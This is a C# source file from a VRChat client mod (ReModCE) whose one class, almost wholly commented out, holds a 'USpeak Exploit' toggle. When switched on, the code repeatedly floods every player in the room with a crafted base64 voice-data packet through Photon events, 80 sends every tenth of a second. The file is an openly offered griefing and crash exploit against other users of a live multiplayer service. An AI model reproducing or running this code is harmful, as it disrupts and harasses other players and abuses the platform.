using ExitGames.Client.Photon;
using MelonLoader;
using Photon.Realtime;
using ReMod.Core;
using ReMod.Core.Managers;
using ReMod.Core.UI.QuickMenu;
using ReModCE.PhotonExtension;
using System;
using System.Collections;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using UnityEngine;
using VRC.SDKBase;

namespace ReModCE.Exploits
{
	internal class Event1_USpeak2 : ModComponent
	{
		//public bool _Event1V2Enabled;
		//private static ReMenuToggle _Event1V2Toggled;
		//public Event1_USpeak2()
		//{
		//}

		//public override void OnUiManagerInit(UiManager uiManager)
		//{
		//	var exploitsMenu = uiManager.MainMenu.GetCategoryPage("Exploits").GetCategory("USpeak");
		//	_Event1V2Toggled = exploitsMenu.AddToggle("USpeak Exploit 2", "Varation 2 of the USpeak Exploit, uses different voice data.", StartE1V2, _Event1V2Enabled);
		//}

		//public void StartE1V2(bool value)
		//{
		//	_Event1V2Enabled = value;
		//	_Event1V2Toggled?.Toggle(value);

		//	if (_Event1V2Enabled)
		//	{
		//		MelonLogger.Msg($"E1V2 Enabled!");
		//		MelonCoroutines.Start(PerformE1V2());
		//	}
		//	if (!_Event1V2Enabled)
		//	{
		//		MelonLogger.Msg($"E1V2 Disabled!");
		//		MelonCoroutines.Start(PerformE1V2());
		//	}
		//}

		//private IEnumerator PerformE1V2()
		//{
		//	while (_Event1V2Enabled)
		//	{
		//		if (_Event1V2Enabled)
		//		{
		//			MelonLogger.Msg($"E1V2 Called!");
		//			byte[] VoiceData = Convert.FromBase64String("Ho8KDOT58voAu4Y7APgAfejAXKBS/jDkHrv/xLHXjN9/0UILAOI1tLBhaAT47sOGLLm2RF5yzbWWOP9+95t7rGxiUBZxWaCG3dnd3Y6Cgv+pp2JCC+biqgIptIX//zMh+ebp4iRKqiIx");
		//			byte[] nulldata = new byte[4];
		//			byte[] ServerTime = BitConverter.GetBytes(Networking.GetServerTimeInMilliseconds());
		//			Buffer.BlockCopy(nulldata, 0, VoiceData, 0, 4);
		//			Buffer.BlockCopy(ServerTime, 0, VoiceData, 4, 4);
		//			int num;
		//			for (int i = 0; i < 80; i = num + 1)
		//			{
		//				PhotonExtensions.OpRaiseEvent(1, VoiceData, new RaiseEventOptions
		//				{
		//					field_Public_ReceiverGroup_0 = 0,
		//					field_Public_EventCaching_0 = 0
		//				}, default(SendOptions));
		//				num = i;
		//			}
		//			yield return new WaitForSecondsRealtime(0.1f);
		//			VoiceData = null;
		//			nulldata = null;
		//			ServerTime = null;
		//			if (!_Event1V2Enabled)
		//			{
		//				yield break;
		//			}
		//		}
		//		yield break;
		//	}
		//}
	}
}
